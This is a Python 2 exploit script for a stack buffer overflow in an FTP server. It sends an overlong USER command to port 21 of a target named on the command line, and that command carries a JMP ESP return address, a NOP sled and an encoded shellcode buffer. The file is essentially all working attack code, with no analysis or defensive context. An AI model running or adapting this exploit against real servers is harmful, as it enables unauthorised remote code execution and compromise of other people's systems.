#!/usr/bin/python2

import sys
import socket

buf =  ""
buf += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\x4c\xd1\x96\x90\x83\xeb\xfc\xe2\xf4\xb0\x39\x14\x90"
buf += "\x4c\xd1\xf6\x19\xa9\xe0\x56\xf4\xc7\x81\xa6\x1b\x1e"
buf += "\xdd\x1d\xc2\x58\x5a\xe4\xb8\x43\x66\xdc\xb6\x7d\x2e"
buf += "\x3a\xac\x2d\xad\x94\xbc\x6c\x10\x59\x9d\x4d\x16\x74"
buf += "\x62\x1e\x86\x1d\xc2\x5c\x5a\xdc\xac\xc7\x9d\x87\xe8"
buf += "\xaf\x99\x97\x41\x1d\x5a\xcf\xb0\x4d\x02\x1d\xd9\x54"
buf += "\x32\xac\xd9\xc7\xe5\x1d\x91\x9a\xe0\x69\x3c\x8d\x1e"
buf += "\x9b\x91\x8b\xe9\x76\xe5\xba\xd2\xeb\x68\x77\xac\xb2"
buf += "\xe5\xa8\x89\x1d\xc8\x68\xd0\x45\xf6\xc7\xdd\xdd\x1b"
buf += "\x14\xcd\x97\x43\xc7\xd5\x1d\x91\x9c\x58\xd2\xb4\x68"
buf += "\x8a\xcd\xf1\x15\x8b\xc7\x6f\xac\x8e\xc9\xca\xc7\xc3"
buf += "\x7d\x1d\x11\xb9\xa5\xa2\x4c\xd1\xfe\xe7\x3f\xe3\xc9"
buf += "\xc4\x24\x9d\xe1\xb6\x4b\x2e\x43\x28\xdc\xd0\x96\x90"
buf += "\x65\x15\xc2\xc0\x24\xf8\x16\xfb\x4c\x2e\x43\xc0\x1c"
buf += "\x81\xc6\xd0\x1c\x91\xc6\xf8\xa6\xde\x49\x70\xb3\x04"
buf += "\x01\xfa\x49\xb9\x9c\x90\x4e\xde\xfe\x92\x4c\xc0\xca"
buf += "\x19\xaa\xbb\x86\xc6\x1b\xb9\x0f\x35\x38\xb0\x69\x45"
buf += "\xc9\x11\xe2\x9c\xb3\x9f\x9e\xe5\xa0\xb9\x66\x25\xee"
buf += "\x87\x69\x45\x24\xb2\xfb\xf4\x4c\x58\x75\xc7\x1b\x86"
buf += "\xa7\x66\x26\xc3\xcf\xc6\xae\x2c\xf0\x57\x08\xf5\xaa"
buf += "\x91\x4d\x5c\xd2\xb4\x5c\x17\x96\xd4\x18\x81\xc0\xc6"
buf += "\x1a\x97\xc0\xde\x1a\x87\xc5\xc6\x24\xa8\x5a\xaf\xca"
buf += "\x2e\x43\x19\xac\x9f\xc0\xd6\xb3\xe1\xfe\x98\xcb\xcc"
buf += "\xf6\x6f\x99\x6a\x66\x25\xee\x87\xfe\x36\xd9\x6c\x0b"
buf += "\x6f\x99\xed\x90\xec\x46\x51\x6d\x70\x39\xd4\x2d\xd7"
buf += "\x5f\xa3\xf9\xfa\x4c\x82\x69\x45"

def genPattern(n):
	result = ""
	for l1 in "ABCDEFGHIJKLMNOPQRSTUVQXYZ":
		for l2 in "abcdefghijklmnopqrstuvwxyz":
			for l3 in "0123456789":
				result += (l1 + l2 + l3)
	return result[0:n]

jmpesp = '\x20\x10\xb4\x7c'
nopsled = "\x90"*16
hostname = sys.argv[1]
username = 'A'*246 + jmpesp + nopsled + buf + \
	'C'*(512 - 264 - 20 - len(buf))
passwd = "anything"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# First, connect, wrapping in exception-handling code.
try:
    sock.connect((hostname, 21)) # The ftp port
except:
    print ('[-] Connection error!')
    sys.exit(1)

r = sock.recv(1024) # response
print "[+] " + r

# now, send username and password across the connection
sock.send("user %s\r\n" %username)
r = sock.recv(1024)
print "[+] " + r

sock.send("pass %s\r\n" %passwd)
r = sock.recv(1024)
print "[+] " + r

sock.close()
